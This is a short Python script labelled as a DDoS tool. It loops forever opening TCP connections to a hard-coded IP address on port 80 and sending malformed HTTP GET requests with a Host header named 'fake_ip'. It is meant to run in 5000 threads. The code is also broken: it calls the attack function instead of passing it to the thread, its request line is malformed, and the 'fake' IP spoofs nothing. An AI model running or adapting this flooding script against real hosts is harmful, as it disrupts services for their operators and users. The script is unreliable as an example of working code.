# DDOS

import threading
import socket

target_ = '172.67.196.53'

port = 80

fake_ip = '182.21.20.32'


def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_, port))
        s.sendto(("GET /" + target_ + "HTTP/1.1\r\n").encode('ascii'), (target_, port))
        s.sendto(('HOST: ' + fake_ip + "\r\n\r\n").encode('ascii'), (target_, port))
        s.close()


for i in range(5000):
    thread = threading.Thread(target=attack())
    thread.start()
print("done")